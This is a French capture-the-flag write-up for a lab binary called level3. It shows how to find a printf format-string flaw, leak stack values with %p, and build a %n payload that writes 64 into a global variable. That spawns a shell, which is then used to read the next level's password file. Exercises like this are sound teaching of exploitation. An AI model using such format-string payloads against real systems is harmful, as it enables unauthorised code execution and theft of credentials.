# Level3

---
###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme deux fonctions V et Main ainsi qu'une variable globale m.

On voit par la suite que dans la fonction V il y a la fonction __printf__ qui est appelé.

 - on utilisera cette fonction pour overflow le programme.

Plus loin dans le progamme m est check pour savoir si elle contient la valeur 64.

si c'est le cas alors le programme lance un terminal bash.

###### Étape 2: -- Récuperation d'information --

Depuis __GDB__, on cherche l'addresse de m qui ce trouve etre ==0x0804988c==.

En lancant le programe comme suit:
```bash
python -c 'print "AAAA" + " %p " * 7' | ./level3
```

on observe ce resultat: 
> AAAA 0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141  0x20702520  0x20702520 

on voit que la chaine "_AAAA_" -> hex: "_0x41414141_" ce situe a la 4ème position.
c'est donc a cette position que l'on vas ecrire payload pour remplir m.

###### Étape 3: -- Execution --

Avec la postion d'écriture du ___printf___ et l'addresse de ___m___, on crée un one-liner python pour executer un payload pour mettre la valeur 64 dans la variable ___m___.

Contruction du payload: 
> (python - c 'print "[m(address)]" + "B" * [64 - sizeof(m)] + "%4$n"'; cat -) | ./binary

Payload final :

```bash
(python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"'; cat -) | ./level3
```

Dans le terminal on execute la commande suivante pour récupérer le password du level4:

```bash
cat /home/user/level4/.pass
```